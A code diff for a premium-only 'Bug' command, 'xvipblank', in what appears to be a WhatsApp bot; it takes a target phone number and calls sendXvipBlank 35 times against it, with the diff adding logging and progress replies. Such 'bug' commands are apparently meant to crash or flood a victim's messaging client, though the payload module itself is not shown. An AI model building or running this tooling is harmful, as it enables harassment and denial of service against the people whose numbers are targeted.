@@ -1,4 +1,11 @@
-import { sendXvipBlank, requirePhoneTarget, getBugTargetBlockReason, sleep } from "@/src/services/system/bug/index.js";
+import {
+  sendXvipBlank,
+  requirePhoneTarget,
+  getBugTargetBlockReason,
+  replyProcessing,
+  replyDone,
+  replyFailed,
+} from "@/src/services/system/bug/index.js";
 
 export default {
   name: "xvipblank",
@@ -7,7 +14,7 @@ export default {
   usage: "628xxx",
   category: "Bug",
   premiumOnly: true,
-  run: async (sock, msg, args, { reply, prefix, commandName, isPrimarySuperOwner }) => {
+  run: async (sock, msg, args, { reply, prefix, commandName, isPrimarySuperOwner, logger }) => {
     const q = args.join(" ");
     if (!q) return reply(`*Syntax Eror*\nExample: ${prefix + commandName} 628xxx`);
     let target;
@@ -18,9 +25,13 @@ export default {
     }
     const blocked = getBugTargetBlockReason(sock, target, { isPrimarySuperOwner });
     if (blocked) return reply(blocked);
-    await reply(`*Success! Send Bug to ${target}*`);
-    await sendXvipBlank(sock, target, { loops: 35 });
-    await sleep(500);
-    console.log("\x1b[31m\x1b[1mSuccess!\x1b[0m");
+    await replyProcessing(reply, target, commandName);
+    try {
+      const { success, failed, ms } = await sendXvipBlank(sock, target, { loops: 35, logger });
+      await replyDone(reply, target, commandName, { success, failed, ms });
+    } catch (err) {
+      logger?.error?.(`[xvipblank] gagal ke ${target}: ${err?.message || err}`);
+      await replyFailed(reply, target, commandName, err);
+    }
   },
 };
